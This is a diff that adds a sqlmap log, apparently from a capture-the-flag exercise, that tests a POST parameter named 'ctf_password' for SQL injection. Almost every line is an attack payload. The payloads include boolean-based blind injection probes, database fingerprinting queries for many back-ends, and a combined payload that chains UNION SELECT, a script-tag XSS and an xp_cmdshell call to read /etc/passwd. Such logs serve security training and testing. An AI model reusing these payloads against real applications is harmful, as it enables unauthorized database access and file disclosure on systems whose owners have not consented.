@@ -1,0 +1,50 @@
+$ sqlmap -r sf_share/post.packet -v 3 -p "ctf_password" --flush-session --level 1
+
+[21:50:33] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:50:33] [PAYLOAD] 3281 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[21:50:33] [INFO] testing if the target URL content is stable
+[21:50:33] [INFO] target URL content is stable
+[21:50:33] [PAYLOAD] ' or '1'%3d'1)"'().(.),
+[21:50:33] [WARNING] heuristic (basic) test shows that POST parameter 'ctf_password' might not be injectable
+[21:50:33] [PAYLOAD] ' or '1'%3d'1'NulfRr<'">YyPGoD
+[21:50:33] [INFO] testing for SQL injection on POST parameter 'ctf_password'
+[21:50:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:50:33] [PAYLOAD] ' or '1'%3d'1) AND 1807=4670 AND (9296=9296
+[21:50:33] [DEBUG] setting match ratio for current parameter to 0.703
+[21:50:33] [PAYLOAD] ' or '1'%3d'1) AND 2401=2401 AND (1682=1682
+[21:50:33] [PAYLOAD] ' or '1'%3d'1 AND 6227=2867
+[21:50:33] [DEBUG] setting match ratio for current parameter to 0.703
+[21:50:33] [PAYLOAD] ' or '1'%3d'1 AND 2401=2401
+[21:50:33] [PAYLOAD] ' or '1'%3d'1') AND 5696=3451 AND ('kAhD'='kAhD
+[21:50:33] [DEBUG] setting match ratio for current parameter to 0.123
+[21:50:33] [PAYLOAD] ' or '1'%3d'1') AND 2401=2401 AND ('WYjE'='WYjE
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND 1014=9655 AND 'YGNJ'='YGNJ
+[21:50:33] [DEBUG] setting match ratio for current parameter to 0.703
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND 2401=2401 AND 'GeLR'='GeLR
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND 4519=1548 AND 'xOtw'='xOtw
+[21:50:33] [INFO] POST parameter 'ctf_password' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="the")
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL AND 'bAHR'='bAHR
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL AND 'kTWJ'='kTWJ
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND (SELECT %SQLUPPER NULL) IS NULL AND 'murm'='murm
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND (SELECT MD5(NULL~NULL)) IS NULL AND 'LRuc'='LRuc
+[21:50:33] [PAYLOAD] ' or '1'%3d'1' AND (SELECT (NULL SETEQ NULL)) IS NULL AND 'fPyS'='fPyS
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CHR(109)||CHR(73)||CHR(67)||CHR(81) FROM SYSIBM.SYSDUMMY1)='mICQ' AND 'SPxE'='SPxE
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL AND 'EpdX'='EpdX
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL AND 'AeTL'='AeTL
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'GNrW' FROM RDB$DATABASE)='GNrW' AND 'roip'='roip
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'WnJI' FROM INFORMATION_SCHEMA.IO_STATISTICS)='WnJI' AND 'cIOT'='cIOT
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT STRINGTOUTF8(NULL)) IS NULL AND 'gkDZ'='gkDZ
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CHAR(65)||CHAR(111)||CHAR(71)||CHAR(105) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='AoGi' AND 'UkQw'='UkQw
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'YhoP' FROM SYSMASTER:SYSDUAL)='YhoP' AND 'UEnO'='UEnO
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL AND 'RRQs'='RRQs
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT TONUMBER(NULL)) IS NULL AND 'gzmH'='gzmH
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL AND 'usre'='usre
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CODE(NULL)) IS NULL AND 'JRsn'='JRsn
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL AND 'xuxM'='xuxM
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT QUARTER(NULL)) IS NULL AND 'MoHJ'='MoHJ
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT INSTR2(NULL,NULL) FROM DUAL) IS NULL AND 'dDDa'='dDDa
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT QUOTE_IDENT(NULL)) IS NULL AND 'tjRn'='tjRn
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT FROM_HEX(NULL)) IS NULL AND 'auUT'='auUT
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT UNLIKELY(NULL)) IS NULL AND 'LRpX'='LRpX
+[21:50:34] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'Lflw')='slGt' AND 'AbDi'='AbDi
+[21:50:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
